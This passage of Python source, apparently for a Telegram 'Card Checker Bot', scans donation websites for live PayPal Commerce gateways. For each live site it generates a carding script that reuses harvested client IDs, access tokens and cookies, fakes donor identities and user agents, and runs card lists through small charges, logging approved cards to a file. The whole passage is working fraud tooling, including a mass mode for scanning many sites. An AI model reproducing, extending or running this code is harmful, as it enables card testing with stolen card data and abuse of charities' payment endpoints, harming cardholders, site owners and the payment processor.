                'link': link, 'status': 'unsupported',
                'reason': f'{gw} (redirect-based)',
                'gateway_type': gw,
            }

        eng = PayPalCommerce(target_url=link, prefetched=prefetched)
        result = eng.Charge(TEST_CARD)
        eng.close()

        if result.startswith('UNSUPPORTED'):
            return {'link': link, 'status': 'unsupported', 'reason': result, 'gateway_type': gw}

        low = result.lower()

        for d in DEAD_RESPONSES:
            if d.lower() in low:
                return {'link': link, 'status': 'dead', 'reason': result, 'gateway_type': gw}

        for p in PAYPAL_RESPONSES:
            if p.lower() in low:
                return {
                    'link': link, 'status': 'live', 'reason': result,
                    'prefetched': prefetched, 'gateway_type': gw,
                }

        return {'link': link, 'status': 'dead', 'reason': result, 'gateway_type': gw}
    except Exception as e:
        return {'link': link, 'status': 'invalid', 'reason': str(e)[:120]}

# ============================================================
# SECTION 7: Gateway Script Generator
# ============================================================
def generate_gateway_code(result, link, prefetched, gateway_type='paypal-commerce'):
    p = prefetched or {}
    client_id = p.get('client_id', '')
    access_token = p.get('access_token', '')
    client_token = p.get('client_token', '')
    form_data = p.get('form_data', {})
    ajax_url = p.get('ajax_url', '')
    cookies = p.get('cookies', {})
    url_netloc = urlparse(link).netloc
    inurl = urlparse(link).path or '/'
    if urlparse(link).query:
        inurl += '?' + urlparse(link).query
    minimum = p.get('minimum_amount', '1.00')

    return f'''# -*- coding: utf-8 -*-
import re, json, base64, random, time
import requests
from urllib.parse import urlparse
from fake_useragent import UserAgent

class PayPal:
    def __init__(self):
        self.client_id = {client_id!r}
        self.access_token = {access_token!r}
        self.client_token = {client_token!r}
        self.form_data = {form_data!r}
        self.ajax_url = {ajax_url!r}
        self.cookies = {cookies!r}
        self.url = {url_netloc!r}
        self.inurl = {inurl!r}
        self.gateway_type = {gateway_type!r}
        self.minimum_amount = {minimum!r}
        self.donation = '1.00'
        self.currency = 'USD'
        self.timeout = 15
        self.first_names = ['James','John','Robert','Michael','William']
        self.last_names = ['Smith','Johnson','Williams','Brown','Jones']
        self.email = f'{{random.choice(self.first_names)}}{{random.randint(100,999)}}@gmail.com'
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()

    def ua(self):
        try: return self.uu.random
        except Exception: return 'Mozilla/5.0'

    def _base_form(self):
        fd = dict(self.form_data)
        fn = random.choice(self.first_names); ln = random.choice(self.last_names)
        fd.update({{
            'give-amount': self.minimum_amount, 'give-currency': self.currency, 'currency': self.currency,
            'payment-mode': 'paypal-commerce',
            'give_first': fn, 'give_last': ln, 'first_name': fn, 'last_name': ln,
            'give_email': self.email, 'email': self.email,
            'give-gateway': 'paypal-commerce',
            'give-address1': '123 Main St', 'give-city': 'New York', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
            'give_agree_to_terms': '1',
        }})
        return fd

    def _amounts(self):
        out = []
        try:
            if float(self.minimum_amount) != 1.0: out.append(self.minimum_amount)
        except Exception: pass
        out += ['5.00','10.00','18.50','25.00','36.50','50.00','100.00']
        return out

    def _create_order(self):
        if self.ajax_url:
            oid = self._create_order_ajax()
            if oid: return oid
        if self.access_token:
            oid = self._create_order_direct()
            if oid: return oid
        if self.client_token:
            oid = self._create_order_with_client_token()
            if oid: return oid
        return None

    def _create_order_ajax(self):
        actions = ['give_paypal_commerce_create_order','give_create_order','create_order']
        headers = {{
            'user-agent': self.ua(),
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}', 'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        for amount in self._amounts():
            fd = self._base_form(); fd['give-amount'] = amount; fd['amount'] = amount
            for action in actions:
                try:
                    r = self.r.post(self.ajax_url, params={{'action': action}}, headers=headers, data=fd, cookies=self.cookies, timeout=self.timeout)
                    if r.status_code == 200 and r.text:
                        try: j = r.json()
                        except Exception: continue
                        if isinstance(j.get('data'), dict) and j['data'].get('id'): return j['data']['id']
                        if isinstance(j.get('data'), str): return j['data']
                        for k in ('id','order_id','orderID'):
                            if j.get(k): return j[k]
                except Exception: continue
        return None

    def _create_order_direct(self):
        try:
            headers = {{
                'authorization': f'Bearer {{self.access_token}}',
                'content-type': 'application/json',
                'user-agent': self.ua(), 'accept': 'application/json',
            }}
            data = {{
                'intent': 'CAPTURE',
                'purchase_units': [{{'amount': {{'currency_code': self.currency, 'value': self.donation}}}}],
                'application_context': {{'shipping_preference': 'NO_SHIPPING','user_action':'PAY_NOW'}},
            }}
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.timeout)
            if r.status_code in (200,201): return r.json().get('id')
        except Exception: pass
        return None

    def _create_order_with_client_token(self):
        try:
            headers = {{
                'authorization': f'Bearer {{self.client_token}}',
                'content-type': 'application/json',
                'user-agent': self.ua(), 'accept': 'application/json',
            }}
            data = {{'intent': 'CAPTURE','purchase_units': [{{'amount': {{'currency_code': self.currency, 'value': self.donation}}}}]}}
            r = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.timeout)
            if r.status_code in (200,201): return r.json().get('id')
        except Exception: pass
        return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            r = self._approve_order_ajax(order_id)
            if r: return r
        if self.access_token:
            try:
                headers = {{'authorization': f'Bearer {{self.access_token}}','content-type':'application/json','user-agent': self.ua()}}
                return self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{{order_id}}/capture', headers=headers, timeout=self.timeout)
            except Exception: pass
        return None

    def _approve_order_ajax(self, order_id):
        actions = ['give_paypal_commerce_approve_order','give_approve_order','approve_order']
        headers = {{
            'user-agent': self.ua(),
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}', 'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        for amount in self._amounts():
            fd = self._base_form(); fd['give-amount'] = amount; fd['amount'] = amount
            for action in actions:
                try:
                    r = self.r.post(self.ajax_url, params={{'action': action, 'order': order_id}}, headers=headers, data=fd, cookies=self.cookies, timeout=self.timeout)
                    if r.status_code == 200: return r
                except Exception: continue
        return None

    def _clean(self, text):
        if not text: return 'EMPTY_RESPONSE'
        s = text.strip(); low = s.lower()
        if low == 'true': return 'CHARGE 1.0'
        try:
            j = json.loads(s)
            if isinstance(j, dict) and j.get('success') is True:
                d = j.get('data') or {{}}
                o = d.get('order') or {{}} if isinstance(d, dict) else {{}}
                if isinstance(o, dict) and str(o.get('status','')).upper() == 'COMPLETED': return 'CHARGE 1.0'
        except Exception: pass
        if 'insufficient' in low: return 'INSUFFICIENT_FUNDS'
        for p in ['ORDER_NOT_APPROVED','INSUFFICIENT_FUNDS','EXPIRED_CARD','PAYEE_BLOCKED_TRANSACTION','SUSPECTED_FRAUD','RESTRICTED_OR_INACTIVE_ACCOUNT','CARD_DECLINED','GENERIC_DECLINE','DECLINED','PAYER_ACTION_REQUIRED']:
            if p in s.upper():
                if p == 'ORDER_NOT_APPROVED': return 'Payer cannot pay for this transaction.'
                return p
        return f'UNKNOWN: {{s[:180]}}'

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split('|')
            if len(parts) < 4: return 'Invalid card format'
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if '20' in yy: yy = yy.split('20')[1]
            expiry = f'20{{yy}}-{{mm}}'
            oid = self._create_order()
            if not oid: return 'Create Order Failed'
            tokens = [t for t in (self.client_token, self.access_token, self.client_id) if t]
            for tok in tokens:
                headers = {{
                    'authorization': f'Bearer {{tok}}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.ua(),
                }}
                payload = {{
                    'payment_source': {{'card': {{
                        'number': n, 'expiry': expiry, 'security_code': cvc,
                        'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                    }}}},
                    'application_context': {{'vault': False}},
                }}
                try:
                    r = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{oid}}/confirm-payment-source', headers=headers, json=payload, timeout=self.timeout)
                    if r.status_code == 200: break
                except Exception: continue
            appr = self._approve_order(oid)
            return self._clean(appr.text if appr else '')
        except Exception as e:
            return f'Error: {{e}}'


if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Checker {{Getat}} - Gateway: paypal-commerce')
    mode = input('Enter Number (Manual : 1 - Combo : 2) : ')
    if mode == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            res = rr.Charge(ar)
            if 'CHARGE' in res or 'INSUFFICIENT_FUNDS' in res:
                with open('Approved Card.txt', 'a', encoding='utf-8') as f:
                    f.write(ar + f': {{res}} > {{Getat}}\\n')
            print('Response: ' + res)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, 'r', encoding='utf-8') as f:
            crads = f.read().splitlines()
        for P in crads:
            noy += 1
            try:
                rr = PayPal()
                res = rr.Charge(P)
            except Exception as e:
                res = f'Error {{e}}'
            if 'CHARGE' in res or 'INSUFFICIENT_FUNDS' in res:
                with open('Approved Card.txt', 'a', encoding='utf-8') as f:
                    f.write(P + f': {{res}} > {{Getat}}\\n')
            print(f'[{{noy}}] ' + P + '  >>  ' + res)
            time.sleep(13)
'''

# ============================================================
# SECTION 8: Telegram Handlers
# ============================================================
def _is_blocked(uid):
    try:
        with open('blockusers.txt', 'r') as f:
            return str(uid) in f.read().splitlines()
    except Exception:
        return False

if not os.path.exists('blockusers.txt'):
    open('blockusers.txt', 'w').close()

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if _is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'You are blocked.')
        return
    u = message.from_user
    txt = f'''[⚡] Welcome To Card Checker Bot 🌟
[⚡] Name: {u.first_name}
[⚡] Username: @{u.username or 'No Username'}
[⚡] ID: <code>{u.id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
- - - - - - - - - - - - - - - - - - - - - -
[⚡] Bot By: @FAWZY30'''
    safe_send_message(message.chat.id, txt)

@bot.message_handler(commands=['block2'])
def cmd_block(message):
    if str(message.from_user.id) not in ADMINS:
        safe_send_message(message.chat.id, 'No permission.')
        return
    try:
        uid = message.text.split()[1]
        with open('blockusers.txt', 'a') as f:
            f.write(uid + '\n')
        safe_send_message(message.chat.id, f'Blocked {uid}')
    except Exception:
        safe_send_message(message.chat.id, 'Usage: /block2 [id]')

@bot.message_handler(commands=['unblock2'])
def cmd_unblock(message):
    if str(message.from_user.id) not in ADMINS:
        safe_send_message(message.chat.id, 'No permission.')
        return
    try:
        uid = message.text.split()[1]
        lines = open('blockusers.txt', 'r').readlines()
        with open('blockusers.txt', 'w') as f:
            for l in lines:
                if l.strip() != uid:
                    f.write(l)
        safe_send_message(message.chat.id, f'Unblocked {uid}')
    except Exception:
        safe_send_message(message.chat.id, 'Usage: /unblock2 [id]')

@bot.message_handler(commands=['paypal'])
def cmd_paypal(message):
    if _is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'Blocked.')
        return
    ko = safe_send_message(message.chat.id, '⏳ Checking gateway...')
    if not ko:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) != 2:
        safe_edit_message(message.chat.id, ko.message_id,
                          'Usage:\n<code>/paypal https://site.com/donate</code>')
        return
    link = parts[1].strip()
    if not link.startswith(('http://', 'https://')):
        safe_edit_message(message.chat.id, ko.message_id, '❌ Invalid URL')
        return

    result = check_single_link(link)
    status = result.get('status')

    if status == 'invalid':
        safe_edit_message(message.chat.id, ko.message_id,
                          f"❌ <b>Invalid:</b> <code>{link}</code>\n💬 {result.get('reason','')}")
        return

    if status == 'dead':
        safe_edit_message(message.chat.id, ko.message_id,
                          f"❌ <b>Dead:</b> <code>{link}</code>\n💬 <b>{result.get('reason','')}</b>")
        return

    if status == 'unsupported':
        safe_edit_message(message.chat.id, ko.message_id,
                          f"⚠️ <b>Unsupported:</b> <code>{link}</code>\n💬 {result.get('reason','')}")
        return

    # ✅ Live
    safe_edit_message(message.chat.id, ko.message_id, '✅ Gateway is Live! Generating script...')

    prefetched = result.get('prefetched') or {}
    code = generate_gateway_code(result['reason'], link, prefetched,
                                  result.get('gateway_type', 'paypal-commerce'))
    fname = f'gateway_{int(time.time())}.py'
    with open(fname, 'w', encoding='utf-8') as f:
        f.write(code)

    try:
        safe_send_document(message.chat.id, fname,
            caption=f"""✅ <b>Live Gateway</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 Respons: <code>{result['reason']}</code>
━━━━━━━━━━━━━━━━━━━━""")
    finally:
        try: os.remove(fname)
        except Exception: pass

    shot = f'shot_{int(time.time())}.png'
    if take_screenshot(link, shot):
        try:
            safe_send_photo(message.chat.id, shot, caption=f'📸 <code>{link}</code>')
        finally:
            try: os.remove(shot)
            except Exception: pass

# ============================================================
# SECTION 9: Mass Processing
# ============================================================
@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    if _is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'Blocked.')
        return
    msg = safe_send_message(message.chat.id, '📁 Send .txt file (one link per line):')
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    uid = message.from_user.id
    if uid in processing_status:
        processing_status[uid]['stop_flag'] = True
        safe_send_message(message.chat.id, '🛑 Stopping...')
    else:
        safe_send_message(message.chat.id, '❌ No active process.')

def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, '❌ Send .txt file.')
        return
    try:
        info = safe_get_file(message.document.file_id)
        if not info:
            safe_send_message(message.chat.id, '❌ Failed to get file.')
            return
        data = safe_download_file(info.file_path)
        if not data:
            safe_send_message(message.chat.id, '❌ Failed to download.')
            return
        links = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]
        if not links:
            safe_send_message(message.chat.id, '❌ Empty file.')
            return
        total = len(links)
        uid = message.from_user.id
        chat_id = message.chat.id
        processing_status[uid] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0, 'unsupported': 0,
            'lock': threading.Lock(),
            'current_url': '', 'current_respons': '',
            'last_live_url': '', 'last_live_reason': '',
            'stop_flag': False, 'done': False,
        }
        status = safe_send_message(chat_id, f'📊 Scanning {total} links...')
        if not status:
            return

        def updater():
            last = ''
            while True:
                time.sleep(10)
                try:
                    with processing_status[uid]['lock']:
                        if processing_status[uid]['done']:
                            break
                        p = processing_status[uid]['processed']
                        lv = processing_status[uid]['live']
                        dd = processing_status[uid]['dead']
                        us = processing_status[uid]['unsupported']
                        cu = processing_status[uid]['current_url']
                        cr = processing_status[uid]['current_respons']
                        pct = int(p / total * 100) if total else 0
                        bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
                        text = (f'📊 Mass Check\n━━━━━━━━━━━━━\n'
                                f'📌 Total: {total}\n✅ Live: {lv}\n❌ Dead: {dd}\n'
                                f'⚠️ Unsupported: {us}\n⏳ {pct}% {bar}\n'
                                f'URL: <code>{cu[:60] if cu else "..."}</code>\n'
                                f'Resp: <code>{cr[:60] if cr else "..."}</code>\n'
                                f'━━━━━━━━━━━━━\n⏱️ {p}/{total} • /stop')
                    if text != last:
                        try:
                            bot.edit_message_text(text, chat_id, status.message_id, parse_mode='HTML')
                            last = text
                        except Exception:
                            pass
                except Exception:
                    pass

        threading.Thread(target=updater, daemon=True).start()
        time.sleep(1)

        for idx, link in enumerate(links):
            if processing_status[uid]['stop_flag']:
                break
            with processing_status[uid]['lock']:
                processing_status[uid]['current_url'] = link
                processing_status[uid]['current_respons'] = 'Checking...'
            result = check_single_link(link)
            status_v = result.get('status')

            with processing_status[uid]['lock']:
                processing_status[uid]['processed'] += 1
                if status_v == 'live':
                    processing_status[uid]['live'] += 1
                    n = processing_status[uid]['live']
                    processing_status[uid]['current_respons'] = result.get('reason', '')
                    processing_status[uid]['last_live_url'] = link
                    processing_status[uid]['last_live_reason'] = result.get('reason', '')
                    try:
                        code = generate_gateway_code(result['reason'], link,
                                                     result.get('prefetched') or {},
                                                     result.get('gateway_type', 'paypal-commerce'))
                        fn = f'gateway_{n}.py'
                        with open(fn, 'w', encoding='utf-8') as f:
                            f.write(code)
                        try:
                            safe_send_document(chat_id, fn,
                                caption=f"""✅ <b>Live Gateway #{n}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 Respons: <code>{result.get('reason','')}</code>
━━━━━━━━━━━━━━━━━━━━""")
                        finally:
                            try: os.remove(fn)
                            except Exception: pass
                    except Exception as e:
                        log.error(f'send file: {e}')
                elif status_v == 'unsupported':
                    processing_status[uid]['unsupported'] += 1
                    processing_status[uid]['current_respons'] = f'UNSUPPORTED: {result.get("reason","")}'
                else:
                    processing_status[uid]['dead'] += 1
                    processing_status[uid]['current_respons'] = result.get('reason', 'Dead')
            if idx % 5 == 0:
                time.sleep(1)
            if idx % 50 == 0 and idx > 0:
                gc.collect()

        with processing_status[uid]['lock']:
            processing_status[uid]['done'] = True
            p = processing_status[uid]['processed']
            lv = processing_status[uid]['live']
            dd = processing_status[uid]['dead']
            us = processing_status[uid]['unsupported']
            last_url = processing_status[uid]['last_live_url']
            last_reason = processing_status[uid]['last_live_reason']
            stopped = processing_status[uid]['stop_flag']

        header = '🛑 Stopped' if stopped else '✅ Done!'
        final = (f'{header}\n📌 Total: {total}\n✅ Live: {lv}\n'
                 f'❌ Dead: {dd}\n⚠️ Unsupported: {us}\n'
                 f'💯 {int(lv/total*100) if total else 0}%')
        try:
            safe_edit_message(chat_id, status.message_id, final)
        except Exception:
            safe_send_message(chat_id, final)

        if last_url:
            shot = f'shot_mass_{int(time.time())}.png'
            if take_screenshot(last_url, shot):
                try:
                    safe_send_photo(chat_id, shot,
                        caption=f"📸 Last Live:\n🔗 <code>{last_url}</code>\n💬 {last_reason}")
                finally:
                    try: os.remove(shot)
                    except Exception: pass

        processing_status.pop(uid, None)
    except Exception as e:
        log.error(f'process_mass_file: {e}')
        safe_send_message(message.chat.id, f'❌ Error: {str(e)[:120]}')
        if 'uid' in locals():
            processing_status.pop(uid, None)

# ============================================================
# SECTION 10: Main Loop
# ============================================================
if __name__ == '__main__':
    log.info('🚀 Bot starting...')

    try:
        me = bot.get_me()
        log.info(f'✅ Bot authenticated: @{me.username} (ID: {me.id})')
    except Exception as e:
        s = str(e)
        if '401' in s or 'Unauthorized' in s:
            log.error('❌ BOT_TOKEN invalid/revoked! Get new one from @BotFather')
            sys.exit(1)
        log.warning(f'⚠️ get_me failed: {s[:100]}')

    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=30, long_polling_timeout=30)
        except KeyboardInterrupt:
            log.info('Stopped by user')
            break
        except Exception as e:
            s = str(e)
            if '401' in s or 'Unauthorized' in s:
                log.error('❌ 401 Unauthorized - BOT_TOKEN invalid! Stopping.')
                sys.exit(1)
            if '409' in s:
                log.warning('409 Conflict, retry 15s'); time.sleep(15); continue
            if '502' in s:
                log.warning('502, retry 10s'); time.sleep(10); continue
            if '429' in s:
                log.warning('429, retry 30s'); time.sleep(30); continue
            if 'timeout' in s.lower():
                log.warning('timeout, retry 5s'); time.sleep(5); continue
            if 'Connection' in s:
                log.warning('connection, retry 5s'); time.sleep(5); continue
            log.error(f'unexpected: {s[:200]}, retry 5s'); time.sleep(5); continue
